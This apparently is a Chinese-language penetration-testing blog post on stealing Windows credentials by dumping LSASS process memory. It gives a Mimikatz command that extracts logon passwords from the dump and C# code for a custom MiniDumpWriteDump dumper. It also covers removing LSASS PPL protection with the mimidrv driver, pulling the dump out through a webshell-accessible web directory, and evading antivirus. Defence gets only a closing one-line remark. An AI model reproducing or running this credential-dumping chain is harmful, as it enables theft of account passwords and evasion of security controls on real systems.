---
layout: post
title: MiniDumpWriteDump
---



## 0x01 

常见内网渗透会经常遇到抓取windows密码的场景，本文用来学习使用内存转储的方式来获取windows密码。

## 0x02

我们可以将转储LSASS的进程内存。Windows允许我们创建转储文件，它是给定进程的快照。此转储包括加载的库和应用程序内存。

在任务管理器中直接转储就可以，他将会生成一个dmp的文件，然后拿回本地用Mimikatz解密即可。



![img](https://gitee.com/a4m1n/tuchuang/raw/master/pic/clipboard.png)

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit > password.txt
```

这样做的缺点是需要图形化界面，需要登录到管理员桌面，然后操作，渗透中常用的方法有sqldump,procdump,不过Procdump在遇到某些AV时候会被拦截，不过选择要procdump的pid来转储时也可以达到Bypass的效果

## 0x03

其实不难发现，Procdump和任务管理器的这两种方法都是使用了MiniDumpWriteDump的API

```
BOOL MiniDumpWriteDump(
  HANDLE                            hProcess,      //获取 LSASS的句柄
  DWORD                             ProcessId,     //获取 LSASS的进程ID号
  HANDLE                            hFile,		   //要写入信息的文件句柄
  MINIDUMP_TYPE                     DumpType,      //要生成的信息类型
  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,  //指向MINIDUMP_EXCEPTION_INFORMATION 结构的指针
  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,  //指向MINIDUMP_USER_STREAM_INFORMATION 结构的指针 
  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam   //指向MINIDUMP_CALLBACK_INFORMATION 结构的指针
);
```

其实并不需要全部的参数，使用前面4个即可，然后看下需要的Import

![image-20210811173030733](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811173030733.png)

```
static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, ref MINIDUMP_EXCEPTION_INFORMATION ExceptionParam,IntPtr UserStreamParam, IntPtr CallbackParam);
```

要获取进程 ID，我们可以使用 Process 类GetProcessesByName 方法

```
Process[] lsass = Process.GetProcessesByName("lsass");
int lsass_pid = lsass[0].Id;
```

使用Process方法的时候需要引入Diagnostics

![image-20210811174541665](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811174541665.png)

使用Win32 OpenProcess来获取Lsass

![image-20210811174944360](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811174944360.png)

```
static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
```

然后我们提供完整的访问参数

![image-20210811190434296](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811190434296.png)

最后设置需要输出的这个文件,这里选择使用Win32 CreateFile这个API

实例化FileStream对象，必须提供两个参数:文件名(lsass.dmp)、文件的完整路径和文件模式,这里要加入System.IO命名空间

![image-20210811191125006](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811191125006.png)

最后调用MiniDumpWriteFile,当向MiniDumpWriteFile加文件句柄时候,要加一个SafeHandle类

```
bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
```

至此结束,完整代码如下

![image-20210811191647971](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811191647971.png)

通常生成的lsass.dmp的文件一般比较大,只有webshell的时候下载不便,但是可以通过copy的方法,把favicon.ico复制到可以访问到的web目录,然后用wget将其下载本地解密,也可以直接把输出的文件地址改到web服务器的物理路径



解密方法

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit > password.txt
```

## 0x04

2012年之后,windows开发了一种缓解的技术,LSASS收到PPL保护,注册表可以看到HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa的值为1,不过该保护机制默认是关闭的

![image-20210811192818106](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811192818106.png)

这种情况下直接抓取密码是会失败的,同样也无法转储,返回错误值0x00000005 (Access拒绝），通常我们privilege::debug

是通过privilege::debug命令通过调用AdjustTokenPrivileges来启用SeDebugPrivilege,这也意味着我们要是系统管理员权限或者本地管理员权限，遇到这种情况可以使用mimikatz加载mimidrv

```
!+

!processprotect /process:lsass.exe /remove
```

![image-20210811193539749](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811193539749.png)

解除保护后就可以正常dump密码了



## 0x05

利用上述方法，可以Bypass国内的大部分AV, 面对卡巴斯基还是略差一点，不过卡巴目前还是可以通过reg的方法获取密码

![image-20210811194142907](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811194142907.png)

防御minidump 可以考虑监控NtReadVirtualMemory，修改指向的内存地址。